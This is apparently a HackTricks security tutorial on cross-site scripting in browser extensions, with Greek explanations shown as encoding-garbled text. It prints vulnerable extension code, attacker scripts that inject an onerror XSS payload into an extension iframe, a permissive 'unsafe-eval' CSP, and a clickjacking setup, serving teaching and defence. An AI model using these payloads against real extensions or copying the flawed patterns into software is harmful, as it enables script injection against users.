# BrowExt - XSS Example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cross-Site Scripting (XSS) Î¼Î­ÏƒÏ‰ Iframe

Î£Îµ Î±Ï…Ï„Î® Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ·, Î­Î½Î± **content script** Ï…Î»Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± Iframe, ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÎ½Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL Î¼Îµ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î¿Ï‚ Ï‰Ï‚ Ï€Î·Î³Î® Ï„Î¿Ï… Iframe:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
ÎœÎ¹Î± Î´Î·Î¼ÏŒÏƒÎ¹Î± Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î· ÏƒÎµÎ»Î¯Î´Î± HTML, **`message.html`**, Î­Ï‡ÎµÎ¹ ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­Ï„ÎµÎ¹ Î´Ï…Î½Î±Î¼Î¹ÎºÎ¬ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÏƒÏ„Î¿ ÏƒÏÎ¼Î± Ï„Î¿Ï… ÎµÎ³Î³ÏÎ¬Ï†Î¿Ï… Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¹Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
ÎˆÎ½Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î± ÎµÎ½ÏŒÏ‚ Î±Î½Ï„Î¹Ï€Î¬Î»Î¿Ï…, Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `content` Ï„Î·Ï‚ Ï€Î·Î³Î®Ï‚ Ï„Î¿Ï… Iframe Î³Î¹Î± Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î­Î½Î± **XSS payload**. Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„Ï…Î³Ï‡Î¬Î½ÎµÏ„Î±Î¹ ÎµÎ½Î·Î¼ÎµÏÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î·Î³Î® Ï„Î¿Ï… Iframe Î³Î¹Î± Î½Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î­Î½Î± ÎµÏ€Î¹Î²Î»Î±Î²Î­Ï‚ ÏƒÎµÎ½Î¬ÏÎ¹Î¿:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
ÎœÎ¹Î± Ï…Ï€ÎµÏÎ²Î¿Î»Î¹ÎºÎ¬ ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÎ® Î Î¿Î»Î¹Ï„Î¹ÎºÎ® Î‘ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Î ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï… ÏŒÏ€Ï‰Ï‚:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· JavaScript, ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÏƒÎµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ XSS.

ÎœÎ¹Î± ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ® Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÎºÎ»Î·Î¸ÎµÎ¯ Ï„Î¿ XSS Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿Ï… Iframe ÎºÎ±Î¹ Ï„Î·Î½ ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï„Î·Ï‚ Ï€Î·Î³Î®Ï‚ Ï„Î¿Ï… ÏÏƒÏ„Îµ Î½Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î¿ ÎµÏ€Î¹Î²Î»Î±Î²Î­Ï‚ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï‰Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `content`:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-based XSS + ClickJacking

Î‘Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€ÏÎ¿Î®Î»Î¸Îµ Î±Ï€ÏŒ Ï„Î·Î½ [Î±ÏÏ‡Î¹ÎºÎ® Î±Î½Î¬ÏÏ„Î·ÏƒÎ·](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).

Î¤Î¿ ÎºÏÏÎ¹Î¿ Ï€ÏÏŒÎ²Î»Î·Î¼Î± Ï€ÏÎ¿Î­ÏÏ‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Cross-site Scripting (XSS) Ï€Î¿Ï… Î²Î±ÏƒÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ DOM, Î· Î¿Ï€Î¿Î¯Î± Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ **`/html/bookmarks.html`**. ÎŸ Ï€ÏÎ¿Î²Î»Î·Î¼Î±Ï„Î¹ÎºÏŒÏ‚ JavaScript, Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… **`bookmarks.js`**, Î±Î½Î±Î»ÏÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î± Î±Î½Î±ÎºÏ„Î¬ Ï„Î·Î½ **Ï„Î¹Î¼Î®** Î±Ï€ÏŒ Ï„Î¿ **`txtName`** Ï€ÎµÎ´Î¯Î¿ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ **ÏƒÏ…Î³ÎºÎ­Î½Ï„ÏÏ‰ÏƒÎ· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÏÎ½ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ HTML**, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î¬Ï„Î±Î¹ ÏƒÏ„Î¿ DOM Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ `.append()` Ï„Î·Ï‚ jQuery.

Î£Ï…Î½Î®Î¸Ï‰Ï‚, Î· Î Î¿Î»Î¹Ï„Î¹ÎºÎ® Î‘ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ Î ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï… (CSP) Ï„Î·Ï‚ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·Ï‚ Chrome Î¸Î± ÎµÎ¼Ï€ÏŒÎ´Î¹Î¶Îµ Ï„Î­Ï„Î¿Î¹ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ **Ï‡Î±Î»Î¬ÏÏ‰ÏƒÎ·Ï‚ CSP Î¼Îµ â€˜unsafe-evalâ€™** ÎºÎ±Î¹ Ï„Î·Ï‚ Ï‡ÏÎ®ÏƒÎ·Ï‚ Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ Ï‡ÎµÎ¹ÏÎ¹ÏƒÎ¼Î¿Ï DOM Ï„Î·Ï‚ jQuery (Î¿Î¹ Î¿Ï€Î¿Î¯ÎµÏ‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ [`globalEval()`](https://api.jquery.com/jquery.globaleval/) Î³Î¹Î± Î½Î± Ï€ÎµÏÎ¬ÏƒÎ¿Ï…Î½ ÏƒÎµÎ½Î¬ÏÎ¹Î± ÏƒÏ„Î¿ [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) ÎºÎ±Ï„Î¬ Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® ÏƒÏ„Î¿ DOM), Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î±ÎºÏŒÎ¼Î± Î´Ï…Î½Î±Ï„Î®.

Î•Î½Ï Î±Ï…Ï„Î® Î· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ®, Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ® Ï„Î·Ï‚ ÎµÎ¾Î±ÏÏ„Î¬Ï„Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î±Ï€ÏŒ Ï„Î·Î½ Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·: ÎµÏ€Î¹ÏƒÎºÎµÏ€Ï„ÏŒÎ¼ÎµÎ½Î¿Ï‚ Ï„Î· ÏƒÎµÎ»Î¯Î´Î±, ÎµÎ¹ÏƒÎ¬Î³Î¿Î½Ï„Î±Ï‚ Î­Î½Î± XSS payload ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ¿Ï…Î¼Ï€Î¯ â€œÎ ÏÎ¿ÏƒÎ¸Î®ÎºÎ·â€.

Î“Î¹Î± Î½Î± ÎµÎ½Î¹ÏƒÏ‡Ï…Î¸ÎµÎ¯ Î±Ï…Ï„Î® Î· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±, ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Î¼Î¹Î± Î´ÎµÏ…Ï„ÎµÏÎµÏÎ¿Ï…ÏƒÎ± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± **clickjacking**. Î¤Î¿ Î¼Î±Î½Î¹Ï†Î­ÏƒÏ„Î¿ Ï„Î·Ï‚ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·Ï‚ Chrome Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬Î¶ÎµÎ¹ Î¼Î¹Î± ÎµÎºÏ„ÎµÎ½Î® Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® `web_accessible_resources`:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
Î£Î·Î¼Î±Î½Ï„Î¹ÎºÎ¬, Î· **`/html/bookmarks.html`** ÏƒÎµÎ»Î¯Î´Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹ÏÏÎµÏ€Î®Ï‚ ÏƒÎµ framing, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÎµ **clickjacking**. Î‘Ï…Ï„Î® Î· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Î³Î¹Î± Î½Î± Ï€Î»Î±Î¹ÏƒÎ¹ÏÏƒÎµÎ¹ Ï„Î· ÏƒÎµÎ»Î¯Î´Î± Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î±Î½ Î¹ÏƒÏ„ÏŒÏ„Î¿Ï€Î¿ Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…, ÎµÏ€Î¹ÎºÎ±Î»ÏÏ€Ï„Î¿Î½Ï„Î¬Ï‚ Ï„Î·Î½ Î¼Îµ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± DOM Î³Î¹Î± Î½Î± Î±Î½Î±ÏƒÏ‡ÎµÎ´Î¹Î¬ÏƒÎµÎ¹ Ï€Î±ÏÎ±Ï€Î»Î±Î½Î·Ï„Î¹ÎºÎ¬ Ï„Î· Î´Î¹ÎµÏ€Î±Ï†Î®. Î‘Ï…Ï„Î® Î· Ï‡ÎµÎ¹ÏÎ±Î³ÏÎ³Î·ÏƒÎ· Î¿Î´Î·Î³ÎµÎ¯ Ï„Î± Î¸ÏÎ¼Î±Ï„Î± Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¿ÏÎ½ Î¼Îµ Ï„Î·Î½ Ï…Ï€Î¿ÎºÎµÎ¯Î¼ÎµÎ½Î· ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Î±ÎºÎ¿ÏÏƒÎ¹Î±.

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
